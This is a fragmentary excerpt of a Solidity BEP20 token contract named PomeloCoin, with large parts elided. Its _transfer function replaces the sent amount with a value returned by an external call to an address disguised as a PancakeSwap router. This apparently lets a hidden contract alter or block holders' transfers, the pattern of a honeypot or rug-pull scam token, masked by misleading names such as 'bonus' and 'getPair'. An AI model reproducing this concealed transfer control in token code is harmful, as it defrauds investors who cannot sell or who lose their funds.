...
contract PomeloCoin is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'PomeloCoin';
  string private constant _symbol = 'PomeloCoin';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusPomeloCoin = 0;
  address pancakeRouter_PomeloCoin;
  ...
  */
  ...
  function pancakePairPomeloCoin(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_PomeloCoin).getPair(_bonusPomeloCoin, sender, recipient, arrData);

      _bonusPomeloCoin = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountPomeloCoin = pancakePairPomeloCoin(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountPomeloCoin);
